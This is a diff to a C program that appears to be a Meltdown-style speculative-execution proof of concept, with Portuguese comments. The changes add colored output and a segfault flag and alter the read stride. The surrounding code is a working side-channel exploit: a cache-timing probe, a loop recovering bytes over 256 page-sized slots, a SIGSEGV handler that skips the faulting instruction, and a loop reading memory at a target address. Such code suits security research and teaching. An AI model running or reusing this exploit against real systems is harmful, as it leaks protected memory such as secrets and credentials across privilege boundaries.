@@ -1,5 +1,8 @@
 #define _GNU_SOURCE
 
+
+
+
 #include <stdio.h>
 #include <string.h>
 #include <signal.h>
@@ -17,9 +20,19 @@
 #define LEN_PAGE	4096
 #define TRIAL_TIMES	 1000
 
+#define KNRM  "\x1B[0m"
+#define KRED  "\x1B[31m"
+#define KGRN  "\x1B[32m"
+#define KYEL  "\x1B[33m"
+#define KBLU  "\x1B[34m"
+#define KMAG  "\x1B[35m"
+#define KCYN  "\x1B[36m"
+#define KWHT  "\x1B[37m"
+
+
 static inline void Flush(void *);
 
-
+int isSegfault=0;
 static inline long Probe(void *addr) {
 	/*ignora as otimizacoes*/
 	volatile unsigned long tempo;
@@ -98,9 +111,7 @@ static inline int FindSecret(void *baseSrc,unsigned treshold)
 	int i=0;
 	int isValid=0;
   	unsigned char alvo;	
-	while (i<256)
-	{
-		
+	while (i<256){
 		
 		tempo=Probe(base+i*LEN_PAGE);
 		//printf("i=%u,tempo=%8x\n",i,tempo);
@@ -119,17 +130,29 @@ static inline int FindSecret(void *baseSrc,unsigned treshold)
 	}
 	if (isValid)
 	{
+	  
+	  if (isSegfault==1)
+          {
+		printf("%s",KRED);
 	
-	  if (alvo > 'A' && alvo < '}')
-	  {
-	  	printf("%c",alvo);
+		isSegfault=0;
 	  }
-   	  else{
-	    //printf("\\x%u",alvo);
-	    printf(".");
+	  else{
+
+		printf("%s",KGRN);
 	  }
 
+	  if (alvo > 'A' && alvo < '}'){
+	      printf("%c",alvo);
+	  }
+	  else{	
+	        printf(".");
+	  }
 	}
+	else{
+	//printf("%s.",KBLU);
+	}
+	printf("%s",KNRM);
 	return isValid;
 
 
@@ -139,6 +162,7 @@ static inline int FindSecret(void *baseSrc,unsigned treshold)
 void handler(int nSignum, siginfo_t* si, void* vcontext) {
   
   //printf("inorando\n");
+  isSegfault=1;
   ucontext_t* context = (ucontext_t*)vcontext;
   context->uc_mcontext.gregs[REG_EIP]++;
 }
@@ -195,7 +219,14 @@ int main(void)
 	unsigned long i;
 	unsigned treshold;
 	char *segredo="isso eh secreto, esse texto eh realmente muito longo. Cuidado com instrucoes especuladas";
-
+    printf("%sred\n", KRED);
+    printf("%sgreen\n", KGRN);
+    printf("%syellow\n", KYEL);
+    printf("%sblue\n", KBLU);
+    printf("%smagenta\n", KMAG);
+    printf("%scyan\n", KCYN);
+    printf("%swhite\n", KWHT);
+    printf("%snormal\n", KNRM);
 
 	installHandler();
 
@@ -204,7 +235,7 @@ int main(void)
 	printf("treshold: %08X\n",treshold);
 
 	//segredo=0xb75b2000;
-	segredo=0xb7551000;
+	//segredo=0xb7551000;
 	
 	
 	i=0;
@@ -212,7 +243,7 @@ int main(void)
 	{
 	  printf("\nlendo, %p\n",segredo+i);
   	  lerBloco(segredo+i,treshold);
-	  i+=LEN_PAGE;
+	  i+=LEN_PAGE*128;
 	
 	
 	}
